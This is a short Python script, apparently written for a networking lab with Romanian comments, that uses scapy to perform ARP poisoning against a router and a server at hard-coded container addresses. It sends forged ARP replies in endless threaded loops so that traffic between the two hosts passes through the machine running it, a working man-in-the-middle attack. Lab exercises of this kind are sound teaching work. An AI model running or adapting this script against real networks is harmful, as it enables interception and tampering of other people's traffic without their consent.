"""Simple ARP poisoning script used for the lab setup."""

from scapy.all import ARP, Ether, sendp
import time
import threading

# IP-urile containerelor
router_ip = "198.7.0.1"
server_ip = "198.7.0.2"

# MAC-urile din diagramă (fixe în Docker)
router_mac = "02:42:c6:0a:00:01"
server_mac = "02:42:c6:0a:00:03"

# Pachet fals pentru server: "router-ul sunt eu (middle)"
def spoof_server():
    pkt = Ether(dst=server_mac) / ARP(op=2, pdst=server_ip,
                                     psrc=router_ip, hwdst=server_mac)
    while True:
        sendp(pkt, iface="eth0", verbose=False)
        time.sleep(2)

# Pachet fals pentru router: "server-ul sunt eu (middle)"
def spoof_router():
    pkt = Ether(dst=router_mac) / ARP(op=2, pdst=router_ip,
                                     psrc=server_ip, hwdst=router_mac)
    while True:
        sendp(pkt, iface="eth0", verbose=False)
        time.sleep(2)

if __name__ == "__main__":
    print("[*] Începem spoofing ARP...")
    threading.Thread(target=spoof_server).start()
    threading.Thread(target=spoof_router).start()
